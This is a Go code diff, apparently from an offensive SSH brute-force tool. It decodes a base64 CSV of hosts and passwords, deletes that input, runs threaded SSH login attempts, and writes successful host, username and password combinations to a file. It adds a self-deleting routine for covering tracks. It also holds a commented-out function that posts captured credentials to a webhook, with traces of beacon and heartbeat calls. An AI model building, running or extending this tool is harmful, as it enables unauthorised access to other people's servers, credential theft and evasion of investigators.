@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/base64"
 	"encoding/csv"
-	"flag"
 	"fmt"
 	"math/rand"
 	"os"
@@ -29,9 +28,15 @@ var DaC []vars.DelaConnection
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 func Bf(conf vars.Config) {
+	file, err := os.OpenFile("c", os.O_CREATE|os.O_APPEND, 0644)
+	if err != nil {
+		check.Check("Error Creating File", err)
+	}
+	if conf.Flags.Destr {
 
-	flag.Parse()
-
+		SelfDel()
+	}
+	file.Close()
 	if conf.Flags.BrFile == "" || conf.Client.Host == "" || conf.Client.Port == "" || conf.Client.User == "" || conf.Client.Pass == "" {
 		return
 	}
@@ -53,7 +58,13 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 				Conn:   ses,
 			}
 			DaC = append(DaC, c)
-			WriteToResults(c)
+			stringToWrite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
+			f, err := os.OpenFile("c", os.O_APPEND, 0644)
+			fmt.Println(err)
+			f.Write([]byte(stringToWrite))
+			fmt.Println(stringToWrite) // TODO Write to file
+			// SendBeacons(stringToErite, conf)
+			// WriteToResults(c)
 
 		case SingleDel := <-msgErr:
 			c := vars.DelaConnection{
@@ -68,20 +79,21 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 
 }
 
-func ReadBfFile() ([][]string, error) {
-	x := check.OpenAndReadFiles("test.csv")
+func ReadBfFile(bFile string) ([][]string, error) {
+	x := check.OpenAndReadFiles(bFile)
+	os.Remove(bFile)
 	fmt.Println()
 	decodedBytes, err := base64.StdEncoding.DecodeString(string(x))
-	if err != nil {
-		fmt.Println("Error decoding base64 BF file:", err)
+	er := check.Check("Error decoding base64 BF file:", err)
+	if er != nil {
 		return [][]string{}, err
 	}
 	fmt.Println(string(decodedBytes))
 	byteReader := bytes.NewReader(decodedBytes)
 	reader := csv.NewReader(byteReader)
 	records, err := reader.ReadAll()
+	check.Check("Error reading records:", err)
 	if err != nil {
-		fmt.Println("Error reading records:", err)
 		return [][]string{}, err
 	}
 	return records, nil
@@ -90,7 +102,7 @@ func ReadBfFile() ([][]string, error) {
 
 func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {
 
-	records, err := ReadBfFile()
+	records, err := ReadBfFile(conf.Flags.BrFile)
 	check.Check("Read Csv Error", err)
 	Ports := []string{}
 	Hosts := []string{}
@@ -141,16 +153,14 @@ func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {
 		}
 	}
 	StartBruteForce(&allC, msgSess, msgErr, conf)
-	if conf.Flags.Destr {
-		os.Remove("c")
-		SelfDel()
-	}
+
 }
 
 func SelfDel() {
 	exePath, err := os.Executable()
 	if err != nil {
-		fmt.Printf("Error changing file permissions: %v\n", err)
+		check.Check("Error changing file permissions: %v\n", err)
+		// fmt.Printf("Error changing file permissions: %v\n", err)
 		return
 	}
 	fmt.Println(os.Args[0])
@@ -167,13 +177,7 @@ func SelfDel() {
 
 func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, conf vars.Config) {
 	// foundSessions := []vars.Connection{}
-	file, err := os.Create("c")
-	if err != nil {
-		fmt.Println("Error creating file:", err)
-		return
-	}
 
-	file.Close()
 	for len(allConn.Conn) != 0 {
 		for i := 1; i <= conf.Flags.Threads; i++ {
 			wg.Add(1)
@@ -195,7 +199,9 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 			time.Sleep(100 * time.Millisecond)
 		}
 		wg.Wait()
-		fmt.Println("END NEXT 3")
+		os.ReadFile("c")
+		// fmt.Println("END NEXT 3")
+		// ("END NEXT 3", conf)
 		// knock.SendKnock("")
 		// delay := 500 * time.Millisecond
 		// knock.SendIAmAlive(conf.Client.Host, conf.Flags.KnockAlive, delay)
@@ -244,29 +250,30 @@ func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
 	client, err := ssh.Dial("tcp", hostPort, config)
 
 	if err != nil {
-
+		check.Check("Error on creating Connection", err)
 		return nil, c, err
 	}
 
 	session, err := client.NewSession()
 	if err != nil {
+		check.Check("Error on creating NewSession", err)
 		return nil, c, err
 	}
 	return session, c, nil
 }
 
-func WriteToResults(c vars.DelaConnection) {
-	f, err := os.OpenFile("res.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0660)
-	if err != nil {
-		panic(err)
-	}
+// func WriteToResults(c vars.DelaConnection) {
+// 	f, err := os.OpenFile("res.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0660)
+// 	if err != nil {
+// 		panic(err)
+// 	}
 
-	defer f.Close()
-	stringToErite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
-	if _, err = f.WriteString(stringToErite); err != nil {
-		panic(err)
-	}
-}
+// 	defer f.Close()
+// 	stringToErite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
+// 	if _, err = f.WriteString(stringToErite); err != nil {
+// 		panic(err)
+// 	}
+// }
 
 func removeDuplicates(nums []int) []int {
 	encountered := map[int]bool{} // Track encountered integers
@@ -291,3 +298,46 @@ func RandomString(length int) string {
 	}
 	return string(b)
 }
+
+// func SendBeacons(msg string, c vars.Config) {
+
+// 	// Data to send to the webhook
+// 	payload := map[string]string{
+// 		"username": c.Client.Host,
+// 		"content":  msg,
+// 	}
+
+// 	// Convert the payload to JSON
+// 	payloadBytes, err := json.Marshal(payload)
+// 	if err != nil {
+// 		check.Check("Error marshaling payload: %v", err)
+// 		log.Fatalf("Error marshaling payload: %v", err)
+// 	}
+
+// 	// Create a new POST request with the JSON payload
+// 	req, err := http.NewRequest("POST", c.Flags.WebHook, bytes.NewBuffer(payloadBytes))
+// 	if err != nil {
+// 		check.Check("Error creating POST request: %v", err)
+// 		log.Fatalf("Error creating POST request: %v", err)
+// 	}
+
+// 	// Set the content-type header to application/json
+// 	req.Header.Set("Content-Type", "application/json")
+
+// 	// Send the request using http.DefaultClient
+// 	resp, err := http.DefaultClient.Do(req)
+// 	if err != nil {
+// 		check.Check("Error sending POST request: %v", err)
+// 		log.Fatalf("Error sending POST request: %v", err)
+// 	}
+// 	defer resp.Body.Close()
+
+// 	// Check the response status
+// 	// if resp.StatusCode != http.StatusOK {
+// 	// 	check.Check("Received non-OK response: %s", err)
+// 	// 	log.Fatalf("Received non-OK response: %s", resp.Status)
+// 	// }
+
+// 	fmt.Println("POST request successful!")
+
+// }
